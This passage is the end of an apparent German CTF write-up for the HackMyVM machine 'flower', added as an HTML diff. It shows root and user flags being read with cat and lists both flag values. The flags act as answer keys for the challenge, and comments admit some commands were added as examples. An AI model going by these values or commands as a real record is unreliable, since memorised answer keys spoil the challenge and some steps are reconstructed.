+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+root@flower:~# <span class="command">cat /root/root.txt</span> <!-- Befehl hinzugefügt -->
+<span class="password">HMV{R0ses_are_als0_black.}</span>
+                       </pre>
+                   </div>
+               </div>
+               <!-- User Flag wird gelesen (als rose oder root) -->
+               <p class="analysis"><strong>Analyse:</strong> Die User-Flag wird gelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> User-Flag `<span class="password">HMV{R0ses_are_R3d$}</span>` erfolgreich gelesen.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+                <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+rose@flower:~$ <span class="command">cat /home/rose/user.txt</span> <!-- Beispielhafter Befehl als rose -->
+<span class="password">HMV{R0ses_are_R3d$}</span>
+                       </pre>
+                   </div>
+               </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV{R0ses_are_als0_black.}</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/rose/user.txt</div>
+                     <div class="flag-value"><span class="password">HMV{R0ses_are_R3d$}</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Nikto Scan extrahiert -->
+        <p>Berichtsdatum: 2. November 2022</p>
+    </footer>
+</body>
+</html>
